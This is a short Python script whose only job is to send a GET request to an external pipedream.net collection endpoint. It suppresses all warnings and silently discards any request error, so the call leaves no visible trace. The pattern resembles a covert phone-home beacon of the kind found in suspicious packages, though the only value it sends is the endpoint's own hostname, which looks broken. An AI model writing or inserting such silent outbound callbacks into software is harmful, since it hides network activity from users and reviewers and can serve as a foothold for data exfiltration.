import requests
import warnings
from urllib.parse import urlparse

# Suppress all warnings
warnings.filterwarnings("ignore")

def send_get_request():
    url = "https://40393dc29bdc15fd0245e3ac19611ae3.m.pipedream.net"
    try:
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        response = requests.get(url, params={"hostname": hostname})
        response.raise_for_status()
    except requests.exceptions.RequestException:
        pass  # Silently ignore any errors

def main():
    send_get_request()
